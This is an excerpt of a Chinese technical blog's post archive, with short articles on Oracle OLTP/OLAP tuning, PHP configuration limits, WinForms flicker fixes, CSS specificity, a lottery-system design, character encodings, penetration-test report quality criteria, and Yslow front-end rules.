语句提交非常频繁的系统。 对于数据块来说，应尽可能让数据块保存在内存当中，对于SQL来说，尽可能使用变量绑定技术来达到SQL重用，减少物理I/O 和重复的SQL 解析，从而极大的改善数据库的性能。 这里影响性能除了绑定变量，还有可能是热快（hot block）。 当一个块被多个用户同时读取时，Oracle 为了维护数据的一致性，需要使用Latch来串行化用户的操作。当一个用户获得了latch后，其他用户就只能等待，获取这个数据块的用户越多，等待就越明显。 这就是热快的问题。 这种热快可能是数据块，也可能是回滚端块。 对于数据块来讲，通常是数据库的数据分布不均匀导致，如果是索引的数据块，可以考虑创建反向索引来达到重新分布数据的目的，对于回滚段数据块，可以适当多增加几个回滚段来避免这种争用。 OLAP，也叫联机分析处理（Online Analytical Processing）系统，有的时候也叫DSS决策支持系统，就是我们说的数据仓库。在这样的系统中，语句的执行量不是考核标准，因为一条语句的执行时间可能会非常长，读取的数据也非常多。所以，在这样的系统中，考核的标准往往是磁盘子系统的吞吐量（带宽），如能达到多少MB/s的流量。 磁盘子系统的吞吐量则往往取决于磁盘的个数，这个时候，Cache基本是没有效果的，数据库的读写类型基本上是db file scattered read与direct path read/write。应尽量采用个数比较多的磁盘以及比较大的带宽，如4Gb的光纤接口。 在OLAP系统中，常使用分区技术、并行技术。 分区技术在OLAP系统中的重要性主要体现在数据库管理上，比如数据库加载，可以通过分区交换的方式实现，备份可以通过备份分区表空间实现，删除数据可以通过分区进行删除，至于分区在性能上的影响，它可以使得一些大表的扫描变得很快（只扫描单个分区）。另外，如果分区结合并行的话，也可以使得整个表的扫描会变得很快。总之，分区主要的功能是管理上的方便性，它并不能绝对保证查询性能的提高，有时候分区会带来性能上的提高，有时候会降低。 并行技术除了与分区技术结合外，在Oracle 10g中，与RAC结合实现多节点的同时扫描，效果也非常不错，可把一个任务，如select的全表扫描，平均地分派到多个RAC的节点上去。 在OLAP系统中，不需要使用绑定（BIND）变量，因为整个系统的执行量很小，分析时间对于执行时间来说，可以忽略，而且可避免出现错误的执行计划。但是OLAP中可以大量使用位图索引，物化视图，对于大的事务，尽量寻求速度上的优化，没有必要像OLTP要求快速提交，甚至要刻意减慢执行的速度。 绑定变量真正的用途是在OLTP系统中，这个系统通常有这样的特点，用户并发数很大，用户的请求十分密集，并且这些请求的SQL 大多数是可以重复使用的。 对于OLAP系统来说，绝大多数时候数据库上运行着的是报表作业，执行基本上是聚合类的SQL 操作，比如group by，这时候，把优化器模式设置为all_rows是恰当的。 而对于一些分页操作比较多的网站类数据库，设置为first_rows会更好一些。 但有时候对于OLAP 系统，我们又有分页的情况下，我们可以考虑在每条SQL 中用hint。 如： Select a.* from table a; 分开设计与优化 在设计上要特别注意，如在高可用的OLTP环境中，不要盲目地把OLAP的技术拿过来用。 如分区技术，假设不是大范围地使用分区关键字，而采用其它的字段作为where条件，那么，如果是本地索引，将不得不扫描多个索引，而性能变得更为低下。如果是全局索引，又失去分区的意义。 并行技术也是如此，一般在完成大型任务时才使用，如在实际生活中，翻译一本书，可以先安排多个人，每个人翻译不同的章节，这样可以提高翻译速度。如果只是翻译一页书，也去分配不同的人翻译不同的行，再组合起来，就没必要了，因为在分配工作的时间里，一个人或许早就翻译完了。 位图索引也是一样，如果用在OLTP环境中，很容易造成阻塞与死锁。但是，在OLAP环境中，可能会因为其特有的特性，提高OLAP的查询速度。MV也是基本一样，包括触发器等，在DML频繁的OLTP系统上，很容易成为瓶颈，甚至是Library Cache等待，而在OLAP环境上，则可能会因为使用恰当而提高查询速度。 对于OLAP系统，在内存上可优化的余地很小，增加CPU 处理速度和磁盘I/O 速度是最直接的提高数据库性能的方法，当然这也意味着系统成本的增加。 比如我们要对几亿条或者几十亿条数据进行聚合处理，这种海量的数据，全部放在内存中操作是很难的，同时也没有必要，因为这些数据快很少重用，缓存起来也没有实际意义，而且还会造成物理I/O相当大。 所以这种系统的瓶颈往往是磁盘I/O上面的。 对于OLAP系统，SQL 的优化非常重要，因为它的数据量很大，做全表扫描和索引对性能上来说差异是非常大的。 其他 1234567891011121314151617Oracle 10g以前的版本建库过程中可供选择的模板有：Data Warehouse （数据仓库）General Purpose （通用目的、一般用途）New DatabaseTransaction Processing （事务处理）Oracle 11g的版本建库过程中可供选择的模板有： 一般用途或事务处理 定制数据库 数据仓库 个人对这些模板的理解为： 联机分析处理（OLAP,On-line Analytical Processing），数据量大，DML少。使用数据仓库模板 联机事务处理（OLTP,On-line Transaction Processing），数据量少，DML频繁，并行事务处理多，但是一般都很短。使用一般用途或事务处理模板。 决策支持系统（DDS，Decision support system)，典型的操作是全表扫描，长查询，长事务，但是一般事务的个数很少，往往是一个事务独占系统。]]></content>
      <categories>
        <category>服务器运维</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[修改PHP上传文件大小限制]]></title>
    <url>%2Farticles%2F%E4%BF%AE%E6%94%B9PHP%E4%B8%8A%E4%BC%A0%E6%96%87%E4%BB%B6%E5%A4%A7%E5%B0%8F%E9%99%90%E5%88%B6%2F</url>
    <content type="text"><![CDATA[修改PHP上传文件大小限制的方法 一般的文件上传,除非文件很小.就像一个5M的文件,很可能要超过一分钟才能上传完.但在php中,默认的该页最久执行时间为 30 秒.就是说超过30秒,该脚本就停止执行. 这就导致出现 无法打开网页的情况.这时我们可以修改 max_execution_time*。在php.ini里查找 *max_execution_time 默认是30秒. 改为 max_execution_time = 0，0表示没有限制。 修改 post_max_size 设定 POST 数据所允许的最大大小。此设定也影响到文件上传。php默认的 post_max_size 为2M.如果 POST 数据尺寸大于 post_max_size $_POST 和 $_FILES superglobals 便会为空 post_max_size 改为 post_max_size = 150M 但上传文件时最大仍然为 8M. 我们还要改一个参数 upload_max_filesize 表示所上传的文件的最大大小。查找upload_max_filesize,默认为 8M 改为 upload_max_filesize = 100M 另外要说明的是,post_max_size 大于 upload_max_filesize 为佳. 把上述参数修改后，在网络所允许的正常情况下，就可以上传大体积文件了 12345678910111213max_execution_time = 600max_input_time = 600memory_limit = 32mfile_uploads = onupload_tmp_dir = /tmpupload_max_filesize = 32mpost_max_size = 32m]]></content>
      <categories>
        <category>PHP</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[如何修改PHP的memory_limit限制]]></title>
    <url>%2Farticles%2F%E5%A6%82%E4%BD%95%E4%BF%AE%E6%94%B9PHP%E7%9A%84memory-limit%E9%99%90%E5%88%B6%2F</url>
    <content type="text"><![CDATA[在运行PHP程序，通常会遇到“Fatal Error: Allowed memory size of xxxxxx bytes exhausted”的错误, 这个意味着PHP脚本使用了过多的内存，并超出了系统对其设置的允许最大内存。解决这个问题，首先需要查看你的程序是否分配了过多的内存，在程序没有问题的情况下，你可以通过一下方法来增加PHP的内存限制（memory_limit)。 检查php的内存限制值 为了查看这个值，你需要建立一个空的php文件，比如view-php-info.php。然后将一下代码贴到里面。 123&lt;?php phpinfo();?&gt; 将这个脚本放到你的PHP主机上，然后在浏览器中调用它。这时你可以看到你的PHP环境配置的信息，其中有一部分是关于”memory_limit”的, 如下图: 注：你可以用这种方法来查看php的其他参数设置，不仅仅是memory_limit memory_limit应该设为多少？ 这个完全依赖于你的应用的要求。比如Wordpress，运行起核心代码需要32MB。Drupal 6则要求这个值最小为16MB，并推荐设置为32MB。如果你又安装不少的插件（plugins），尤其是那些要进行图像处理的模块，那么你可能需要128MB或更高的内存。 如何设置memory_limit 方法1: php.ini 最简单或常用的方法是修改php.ini 首先找到对你的网站生效的php.ini文件 由于有多个地方都可以设置php的参数，找到正确的配置文件，并进行更改是首先要做的一步。如果你上面的方法建立了php文件来查看其配置参数，则你可以找到 Loaded Configuration File 这一项，以下是个例子： 对于Linux用户，你可以通过执行php -i | grep Loaded Configuration File来找到对应的配置文件。而Windows用户，你可以尝试修改你的php安装目录下的php.ini。 编辑php.ini 在php.ini中，找到memory_limit这一项，如果没有，你可以在文件的尾部自己增加这个参数。以下是一些设置范例 1memory_limit = 128M ; 可以将128M改为任何你想设置的值 保存文件 重启web 服务器 如果是web服务器使用Apache, 则执行: 1httpd restart 有些情况下，你可能不被允许私修改php.ini。比如如果你购买了虚拟主机服务，但是你的服务商确禁止你修改这个文件。那么，你可以需要考虑用其他方法来增加memory_limit的值。 方法2: .htaccess 说明: 这种方法只有在php以Apache模块来执行时才生效. 在你的网站的根目录下找到”.htaccess”文件，如果没有，可以自己创建一个。然后把以下配置放入其中 1php_value memory_limit 128M ; // 可以将128M改为任何你想设置的值 方法3: 运行时修改php的内存设置 在你的php代码中增加以下命令行即可。 1ini_set(&apos;memory_limit&apos;, &apos;128M&apos;); 如果你使用虚拟主机，有可能会出现memory_limit的值修改失败。这个需要联系你的服务商看怎么处理，通常他们限制了可以设置的最大值或者根本就不允许你修改。如果他们的环境真的无法满足你的要求，那么你可能要考虑换一个主机服务商。]]></content>
      <categories>
        <category>PHP</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[Winform MDI窗体切换不闪烁的解决办法（测试通过）]]></title>
    <url>%2Farticles%2FWinform%20MDI%E7%AA%97%E4%BD%93%E5%88%87%E6%8D%A2%E4%B8%8D%E9%97%AA%E7%83%81%E7%9A%84%E8%A7%A3%E5%86%B3%E5%8A%9E%E6%B3%95%EF%BC%88%E6%B5%8B%E8%AF%95%E9%80%9A%E8%BF%87%EF%BC%89%2F</url>
    <content type="text"><![CDATA[MDI窗体不闪烁方法测试通过： 12345//.net 4.0用OptimizedDoubleBufferthis.SetStyle(ControlStyles.OptimizedDoubleBuffer | ControlStyles.UserPaint | ControlStyles.AllPaintingInWmPaint, true);this.UpdateStyles(); 真正有效的方法：在最上层窗体加上 1234567protected override CreateParams CreateParams &#123; get &#123; CreateParams cp = base.CreateParams; cp.ExStyle |= 0x02000000; /* Turn on WS_EX_COMPOSITED */ return(cp); &#125;&#125; 在下层的窗体和自定义控件加上 123456789protected override CreateParams CreateParams&#123; get &#123; CreateParams cp = base.CreateParams; cp.Style &amp;= ~0x02000000; /* Turn off WS_CLIPCHILDREN */ return(cp); &#125;&#125; 注意：如果加错地方或人品不好，某些时候可能会造成控件绘制略微不正常。 如果人品爆发的话，貌似在下层窗体直接加 cp.Style &amp;= ~0x02000000 就行，不需要在上层窗体加 cp.ExStyle |= 0x02000000; 注意下层窗体代码在ListBox或者ListView的Anchor设有Right，且窗体BackColor与控件背景不同的时候，可能会发现控件初始化显示不正常。需要做一下MdiParent.Refresh或者取消Right; 引用MSDN中对CreateParams的说明： 在你开发的重载控件中不要重写这个属性，通过这个属性控制控件的某些风格。只有在你封装Windows控件或者想实现某些WinForm没有提供的风格（比如Layered Window）控制的时候再使用这个属性。更多信息请参照MSDN上对CreateWindow方法和CreateWindowEx方法的参数CREATESTRUCT结构体的文档注释。 简述为何CreateParams能够实现这样高级的样式控制，因为从CreateWindow和CreateWindowEx的名字就可以看出，CreateParam是传递给这俩个方法的参数，而这两个方法又是在窗体创建的时候调用的。所以，CreateParam才能够实现如此强大的样式控制。 节点更新要使用 BeginUpdate 和 EndUpdate 这一对操作对于需要批量操作更新控件的情景有比较好的效果，比如初始化时批量添加了大量节点。坏处就在于不能即时更新。所以，对于频繁的更新节点并希望立即反映到界面的情况不适用。如果使用并且没有禁掉清除界面消息的话，则控件看起来就会不停的闪烁，而且以白底为主，内容几乎不可见（这个视频繁程度而定）。因为界面更新都在EndUpdate处完成，操作太多导致EndUpdate阻塞时间过长，且清空在先，更新在后，导致界面看起来长时间处于空白状态。 某些情况下可以使用禁止背景更新 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859protected override void WndProc( ref Message m )&#123; if ( m.Msg == 0x0014 ) return; /* 禁掉清除背景消息 */ base.WndProc( ref m );&#125;public ListViewNF()&#123; /* 开启双缓冲 */ this.SetStyle( ControlStyles.OptimizedDoubleBuffer | ControlStyles.AllPaintingInWmPaint, true ); /* Enable the OnNotifyMessage event so we get a chance to filter out */ /* Windows messages before they get to the form's WndProc */ this.SetStyle( ControlStyles.EnableNotifyMessage, true );&#125;protected override void OnNotifyMessage( Message m )&#123; /* Filter out the WM_ERASEBKGND message */ if ( m.Msg != 0x14 ) &#123; base.OnNotifyMessage( m ); &#125;&#125;// 采 用LockWindowUpdate API[DllImport( "user32.dll" )]static extern bool LockWindowUpdate( IntPtr hWndLock );LockWindowUpdate( panelContainer.Handle );/* Clear Panel */panelContainer.Controls.Clear();/* my temporary TextBox */TextBox myT;for ( int lauf = 0; lauf &lt; 200; lauf++ )&#123; /* Create New TextBox */ myT = new TextBox(); /* Add TextBox to the Panel */ panelContainer.Controls.Add( myT );&#125;/* redraw the window */LockWindowUpdate( IntPtr.Zero );frmChild1.Hide(); /* 隐藏当前显示的子窗体2 3 */LockWindowUpdate( this.Handle ); /* 锁定父窗体4 */frmChild2.Show(); /* 显示窗体等其他需要再显示前做的事5 */LockWindowUpdate( IntPtr.Zero ); /* 解锁父窗体6 */RedrawWindow( this.Handle, IntPtr.Zero, IntPtr.Zero, RDW_ERASE | RDW_INVALIDATE | RDW_ALLCHILDREN );/* (0x04 | 0x01 | 0x80)立即强制重绘父窗体及其所有子窗体效果好转，但人眼还能看到一些花屏现象，仍不能一次全部完整显示。 */ 使用Windows API中的SendMessage函数： 12345678910111213141516171819202122232425262728293031/* 拦截控件重绘 */class DrawingControl&#123; [DllImport( "user32.dll" )] public static extern int SendMessage( IntPtr hWnd, Int32 wMsg, bool wParam, Int32 lParam ); private const int WM_SETREDRAW = 11; public static void SuspendDrawing( Control parent ) &#123; SendMessage( parent.Handle, WM_SETREDRAW, false, 0 ); &#125; public static void ResumeDrawing( Control parent ) &#123; SendMessage( parent.Handle, WM_SETREDRAW, true, 0 ); parent.Refresh(); &#125;&#125;/* 禁止窗体中的绘制操作 */frmChild1.Hide();SendMessage( this.Handle, WM_SETDRAW, false, null );/* 显示窗体等其他需要再显示前做的事 */frmChild2.Show();SendMessage( this.Handle, WM_SETDRAW, true, null );/* 解除禁止绘制操作 */RedrawWindow( this.Handle, IntPtr.Zero, IntPtr.Zero, RDW_ERASE | RDW_INVALIDATE | RDW_ALLCHILDREN ); /* (0x04 | 0x01 | 0x80)立即强制重绘父窗体及其所有子窗 */ SendMessage函数中，发送消息 WM_SETREDRAW，设置SETREDRAW为FALSE，导致窗口不进行绘制。 此时，看到的窗体是假的，现象：鼠标形状是后面应用程序的形状；鼠标划过，后面的应用程序就显示出来了。人眼看到的就是“花屏”。]]></content>
      <categories>
        <category>.NET</category>
      </categories>
      <tags>
        <tag>MDI窗体闪烁</tag>
        <tag>SendMessage</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[微信版本判断]]></title>
    <url>%2Farticles%2F%E5%BE%AE%E4%BF%A1%E7%89%88%E6%9C%AC%E5%88%A4%E6%96%AD%2F</url>
    <content type="text"><![CDATA[微信团队建议通过user agent来确定用户当前的版本号。以iPhone版本为例，可以通过user agent可获取如下版本示例信息： “Mozilla/5.0(iphone;CPU iphone OS 5_1_1 like Mac OS X) AppleWebKit/534.46(KHTML,like Geocko)Mobile/9B206 MicroMessenger/6.0.2 “ 其中6.0.2为用户安装的微信版本号]]></content>
      <categories>
        <category>前端开发</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[CSS选择器优先级]]></title>
    <url>%2Farticles%2FCSS%E9%80%89%E6%8B%A9%E5%99%A8%E4%BC%98%E5%85%88%E7%BA%A7%2F</url>
    <content type="text"><![CDATA[原理CSS选择器的优先级关系是: 内联 &gt; ID选择器 &gt; 类选择器 &gt; 标签选择器 《CSS REFACTORING》 中提到了算法的过程 : A specificity is determined by plugging numbers into (a, b, c, d): If the styles are applied via the style attribute, a=1; otherwise, a=0. b is equal to the number of ID selectors present. c is equal to the number of class selectors, attribute selectors, and pseudoclasses present. d is equal to the number of type selectors and pseudoelements present. 即优先级是由 A 、B、C、D 的值来决定的，其中它们的值计算规则如下： 如果存在内联样式，那么 A = 1, 否则 A = 0; B 的值等于 ID选择器 出现的次数; C 的值等于 类选择器 和 属性选择器 和 伪类 出现的总次数; D 的值等于 标签选择器 和 伪元素 出现的总次数 。 例如： 123456789101112li /* (0, 0, 0, 1) */ul li /* (0, 0, 0, 2) */ul ol+li /* (0, 0, 0, 3) */ul ol+li /* (0, 0, 0, 3) */h1 + *[REL=up] /* (0, 0, 1, 1) */ul ol li.red /* (0, 0, 1, 3) */li.red.level /* (0, 0, 2, 1) */a1.a2.a3.a4.a5.a6.a7.a8.a9.a10.a11 /* (0, 0, 11,0) */#x34y /* (0, 1, 0, 0) */li:first-child h2 .title /* (0, 0, 2, 2) */#nav .selected &gt; a:hover /* (0, 1, 2, 1) */html body #nav .selected &gt; a:hover /* (0, 1, 2, 3) */ 优先级比较规则： 从左往右依次进行比较 ，较大者胜出，如果相等，则继续往右移动一位进行比较 。如果4位全部相等，则后面的会覆盖前面的 例子有如下html代码： 123&lt;div id="b"&gt; &lt;a href="" class="a" id="a"&gt;ALink&lt;/a&gt;&lt;/div&gt; 如果设置css样式： 12#b a &#123;color:red;&#125;#a &#123;color: green;&#125; 问题：#b a生效，还是#a生效? 答案：ALink 解析： 12#b a /* (0, 1, 0, 1) */#a /* (0, 1, 0, 0) */ 比较得出 #b a优先级更高 特例如果我们给#a的css后加上!important 那么#a的优先级变为最高，甚至比在html标签上加style的优先级还要高。 比如如下代码： 12345678910111213141516&lt;!DOCTYPE html&gt;&lt;!DOCTYPE html&gt;&lt;html lang="en"&gt; &lt;head&gt; &lt;meta charset="UTF-8" /&gt; &lt;title&gt;CSS Test&lt;/title&gt; &lt;style&gt; #a&#123; color: green !important; &#125; &lt;/style&gt; &lt;/head&gt; &lt;body&gt; &lt;div id="b"&gt; &lt;a href="" id="a" style="color:blue"&gt;ALink&lt;/a&gt; &lt;/div&gt; &lt;/body&gt;&lt;/html&gt; 显示的结果 ALink如果在标签内联样式加入!important那么显示 ALink]]></content>
      <categories>
        <category>前端开发</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[如何开发公司年会抽奖系统]]></title>
    <url>%2Farticles%2F%E5%A6%82%E4%BD%95%E5%BC%80%E5%8F%91%E5%85%AC%E5%8F%B8%E5%B9%B4%E4%BC%9A%E6%8A%BD%E5%A5%96%E7%B3%BB%E7%BB%9F%2F</url>
    <content type="text"><![CDATA[需求出现年会将近，而年会抽奖环节必不可少，但是抽奖系统却还没有。所以某一天，PM走过来说：小伙，手头的需求修完成了吧！在年会开始之前必须做出一个抽奖系统。这个系统很简单，后台可以设置总金额，然后每个用户可以获得的金额范围，金额派完则显示很遗憾没有中奖，还要设置抽奖活动时间。 需求分析一看这东西，就觉得非常简单。最简单的一个方案，活动时间放在一个数据表，总金额和已经使用金额存放在一个表，已经派送的日志一个表。后台提供一个接口，客户端手动点击按钮，则发送一个请求。账号体系直接使用微信的oauth，接口首先判断活动有没有开始，如果开始则随机一个金额，然后判断如果派送该金额会不会超预算，如果不超预算，则调用微信的现金接口发放零钱。 并发问题这个简单方案存在一个致命的问题，就是并发下，可能导致超预算的问题。如果采用加锁的方式，面对1000多员工同时请求，系统100%瘫痪。（因为抽奖系统的服务器是最普通的1核1G 1M带宽的服务器） 那么不加锁的情况，又能如何避免并发造成的派送超过预算的问题呢？ 一个简单的办法，把分配派送金额的操作从并行变成串行。那么就需要异步的编程方法。最简单的处理方法，把任务写入mysql，然后启动一个独立的进程来一个任务一个任务的串行处理。异步的话，客户端如何知道服务器已经处理了呢？最简单就是采用轮询的方法了，客户端每隔几秒就请求服务器一次。 性能问题由于抽奖是短时间大量用户请求的，如果直接让请求落到mysql，类似DDOS攻击,一般的数据库是扛不住的。而redis是1种基于内存的高并发NoSQL,在很多公司广泛使用,由于其性能非常好，并且其丰富的数据接口完全可以胜任抽奖任务需求。 这个时候，你可能有这样的疑问,我们的系统设计是怎么样的呢？ 抽奖系统相关配置存储在redis的一个key值，直接使用json格式客户端请求的时候判断，时间是否在活动时间范围内客户端请求如果时间在活动范围内，则把用户添加到一个redis集合，用于防止用户重复请求，只有第一次请求才会添加到集合后，再添加到一个redis列表。后台一个独立的进程，从redis列表pop第一位用户，然后分配一个金额，然后把金额和用户信息压入另一个redis列表B，同时写入redis的hash结构，标示用户获得多少现金。一直循环该过程。后台另一个独立的进程，从redis列表B pop第一位用户，然后调用发送现金接口，一直循环该过程。客户端不停轮询获取用户金额的接口，该接口从哪个hash结构获取用户金额，然后没有数据，则告诉客户端若干秒后再次请求。 前端优化由于参与活动的人数较多，而且服务器是放在外网的，所以需要考虑带宽的问题。 第一步，把静态资源放到cdn。第二步，抽奖页面静态化，同时也放到cdn，这样子服务器只需要承受用户请求和登录即可。第三步，由于采用了微信登录，所以登录系统采用一个独立的进程，并且使用异步框架来处理高并发。第四步，前端发送请求队列化处理，避免用户不停点击，造成大量请求。 总结整套系统开发没有任何难度，唯一需要注意高并发下性能和数据问题。静态资源放到cdn，避免带宽成为瓶颈。把mysql操作变成redis操作，解决io问题]]></content>
      <tags>
        <tag>随笔</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[字符编码基础]]></title>
    <url>%2Farticles%2F%E5%AD%97%E7%AC%A6%E7%BC%96%E7%A0%81%E5%9F%BA%E7%A1%80%2F</url>
    <content type="text"><![CDATA[ACSII规定：一个字符由一个字节存储。范围：前32位（0x00 — 0x20）为控制码。第32位至127位（0x20 — 0x7f）为空格、标点符号、数字、字母。127位以后不用。 扩展字符集 原因： 由于其它国家的字符太多，ASCII标准已经不够用，所以他们启用了127位以后的全部空位。 GB2312 原因：由于其它国家制定的扩展字符集并不适用于中文，所以中国人重新制定了符合本国国情的编码方式：GB2312（GB2312是对ASCII码的中文扩展）。规定：小于127的字符意义同ASCII标准一样，但两个大于127的字符连在一起时，就表示一个汉字。范围：前一个字节（高字节）使用范围为：0xa1 — 0xf7后一个字节（低字节）使用范围为：0xa1 — oxfe GBK 原因：后来由于汉字实在太多，GB2312已经不够使用了，于是又制定了新的编码:GBK，取消了GB2312中对汉字低字节的限制。规定: 小于127的字符意义同ASCII标准一样，如果遇到大于127位的字节则无论其后的一个字节是否是大于127都将这个两个字节视为一个汉字（GB2312要求两个字节都要大于127，但GBK取消了对低字节的要求）。范围：前一个字节（高字节）使用范围为：0x81 — 0xfe后一个字节（低字节）使用范围为：0x40 — 0xfe GB18030 原因: 由于GBK并没有包含少数民族的文字字符，所以又再次对GBK进行扩展以包含少数名族字符，由此又制定了新的编码GB18030，从此该编码方式可以完全表示中华民族的所有字符了。 小结：人们为了统一称呼这些【汉字】编码方式，于是把它们都叫做DBCS（Double Byte Charecter Set，双字节字符集），它们最大的特点就是两个字节长的汉字字符和一个字节长的英文字符并存在一套编码系统里。因此在处理这些编码时要时刻注意每一个字节的值是否是大于127，如果小于则取按照ASCII标准取值，如过大于则表示一个汉字开始了，这时就要和它和后面一个字节一起组合起来识别为一个汉字字符。 Unicode 原因： 由于每个国家都制定了自己的一套编码体系，造成各个国家之间的字符编码互不兼容，于是ISO组织统一制定了能包含全球所有文化、字符、符号的编码标准：Universal Multiple-Octet Coded Character Set”，简称 UCS, 俗称 “UNICODE”。规定： Unicode规定所有字符都统一使用两个字节编码，即使用16位来统一表示所有字符，对于ASCII标准的字符保持其值不变，但字节长度由一个字节变成两个字节，所以英文字符的Unicode编码的高字节永远都为0，因此也造成了存储空间的浪费。 UTF-8 定义： UTF即UCS Transfer Format（Unicode传输格式），utf-8是在网络上传输Unicode字符的一项标准，它是Unicode的主要实现方式之一。它每次传输8位数据，但它并不是直接对应Unicode的字节的值，而是为了传输的可靠性制定了一套从Unicode到utf-8的转换规则。转换规则： Unicode UTF-8 0000 - 007F 0xxxxxxx 0080 - 07FF 110xxxxx 10xxxxxx 0800 - FFFF 1110xxxx 10xxxxxx 10xxxxxx 举例： ‘汉’字的Unicode编码是：6C49，通过上表可以得出，它在0x0800到0xffff之间，所以它需要使用3个字节来传输，将6C49转位二进制： 0110 1100 0100 1001，按照utf-8的格式转换，第一个字节为：[1110]0110，第二个字节为:[10]110001，第三个字节为：[10]001001，所以将‘汉’字的unicode转换为utf-8之后的二进制是：11100110 10110001 10001001 ，即16进制E6 B1 89 单字节： 由一个字节构成一个字符的编码。如ASCII 多字节： 由一个或多个字节构成一个字符的编码。如GB2312、GBK宽字节： 始终由两个字节构成一个字符的编码。如Unicode]]></content>
      <tags>
        <tag>随笔</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[渗透测试报告标准]]></title>
    <url>%2Farticles%2F%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%8A%A5%E5%91%8A%E6%A0%87%E5%87%86%2F</url>
    <content type="text"><![CDATA[优秀的报告标准漏洞标题 标题描述：标题可简明扼要说明问题，描述语言规范化。如“testasp.vulnweb.com站showforum.asp请求存在SQL注入漏洞”“testasp.vulnweb.com站查看订单处存在越权漏洞” 基本信息 漏洞类型：填写信息准确无误 漏洞等级：填写信息准确无误 厂商信息：填写信息准确无误 漏洞描述 漏洞简述：包含漏洞概述，漏洞危害 漏洞正文 漏洞复现过程：复现过程完整，无需二次沟通或补充数据 分步骤图文描述：有详细的漏洞复现步骤、测试步骤，并每个步骤配有图文描述。平台、厂商可根据描述一次性完成漏洞复测 漏洞危害证明：漏洞危害证明完整，无误 URL及重要参数：URL及重要参数完整，无误 格式排版、专业术语：格式排版规范；无病句错别字；描述用语专业化，规范化 修复建议 漏洞修复建议：修复建议对开发有较大实用性，如修复思路，修复代码样式，伪代码等 良好的报告标准漏洞标题 标题描述：标题可基本概括漏洞情况，描述语言缺乏规范性。如“一处注入漏洞”“另外一处注入”“网站某处存在越权” 基本信息 漏洞类型：填写信息准确无误 漏洞等级：填写信息准确无误 厂商信息：填写信息准确无误 漏洞描述 漏洞简述：包含漏洞概述 漏洞正文 漏洞复现过程：复现过程基本完整，个别地方描述不清或缺少数据，对漏洞评估、复现有一定影响 分步骤图文描述：关键测试步骤完整，但复现步骤缺失，对漏洞复现有一定影响。如直接粘贴出漏洞利用请求包，但缺乏测试步骤如何获取此请求包，需要二次沟通方才可复现 漏洞危害证明：漏洞危害证明基本完整 URL及重要参数：URL及重要参数基本完整 格式排版、专业术语：格式排版不影响正常阅读；个别病句错别字；描述用语较为规范化 修复建议 漏洞修复建议：修复建议基本无误，但过于简单，无实际参考意义。如“控制权限”，“过滤参数”，“校验身份” 较差的报告标准漏洞标题 标题描述：标题描述不清；与漏洞详情不符；夸大漏洞级别及危害 基本信息 漏洞类型：填写信息准确无误 漏洞等级：填写信息准确无误 厂商信息：填写信息准确无误 漏洞描述 漏洞简述：无效的漏洞描述，如“RT”，“请看详情” 漏洞正文 漏洞复现过程：复现过程关键步骤缺失，影响正常的漏洞评估、复现 分步骤图文描述：无测试步骤；无文字描述，直接粘贴截图。对漏洞评估、复现、修复工作产生较大影响。 漏洞危害证明：无有效漏洞危害证明或主管臆断危害。 URL及重要参数：缺少关键URL，核心参数，影响复现 格式排版、专业术语：格式排版混乱，影响正常阅读；出现较多的病句，错别字；过于口语化、网络化用语，如“你懂的” 修复建议 漏洞修复建议：无意义或错误的修复建议。如“不知道”，“你懂的”，“问开发”，“修复”]]></content>
      <categories>
        <category>安全研究</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[前端Yslow的23个优化原则]]></title>
    <url>%2Farticles%2F%E5%89%8D%E7%AB%AFYslow%E7%9A%8423%E4%B8%AA%E4%BC%98%E5%8C%96%E5%8E%9F%E5%88%99%2F</url>
    <content type="text"><![CDATA[最常遇见的前端优化问题。 Yslow是雅虎开发的基于网页性能分析浏览器插件，可以检测出网页的具体性能值，并且有著名的Yslow 23条优化规则: 减少HTTP请求次数尽量合并图片、CSS、JS。比如加载一个页面，如果有5个css文件的话，那么会发出5次http请求，这样会让用户第一次访问你的页面的时候会长时间等待。而如果把这个5个文件合成一个的话，就只需要发出一次http请求，节省网络请求时间，加快页面的加载。 使用CDN网站上静态资源即css、js全都使用cdn分发，图片亦然。 避免空的src和href当link标签的href属性为空、script标签的src属性为空的时候，浏览器渲染的时候会把当前页面的URL作为它们的属性值，从而把页面的内容加载进来作为它们的值。所以要避免犯这样的疏忽。 为文件头指定ExpiresExipres是用来设置文件的过期时间的，一般对css、js、图片资源有效。 他可以使内容具有缓存性，这样下回再访问同样的资源时就通过浏览器缓存区读取，不需要再发出http请求。如下例子： 使用gzip压缩内容gzip能够压缩任何一个文本类型的响应，包括html，xml，json。大大缩小请求返回的数据量。 把CSS放到顶部网页上的资源加载时从上网下顺序加载的，所以css放在页面的顶部能够优先渲染页面，让用户感觉页面加载很快。 把JS放到底部加载js时会对后续的资源造成阻塞，必须得等js加载完才去加载后续的文件 ，所以就把js放在页面底部最后加载。 避免使用CSS表达式举个css表达式的例子 font-color: expression( (new Date()).getHours()%3 ? “#FFFFFF” : “#AAAAAA” ); 这个表达式会持续的在页面上计算样式，影响页面的性能。并且css表达式只被IE支持。 将CSS和JS放到外部文件中目的是缓存文件，可以参考原则4。 但有时候为了减少请求，也会直接写到页面里，需根据PV和IP的比例权衡。 权衡DNS查找次数减少主机名可以节省响应时间。但同时，需要注意，减少主机会减少页面中并行下载的数量。 IE浏览器在同一时刻只能从同一域名下载两个文件。当在一个页面显示多张图片时，IE 用户的图片下载速度就会受到影响。所以新浪会搞N个二级域名来放图片。 下面是新浪微博的图片域名，我们可以看到他有多个域名，这样可以保证这些不同域名能够同时去下载图片，而不用排队。不过如果当使用的域名过多时，响应时间就会慢，因为不用响应域名时间不一致。 精简CSS和JS这里就涉及到css和js的压缩了。比如下面的新浪的一个css文件，把空格回车全部去掉，减少文件的大小。现在的压缩工具有很多，基本主流的前端构建工具都能进行css和js文件的压缩，如grunt，glup等。 避免跳转有种现象会比较坑爹，看起来没什么差别，其实多次了一次页面跳转。比如当URL本该有斜杠（/）却被忽略掉时。 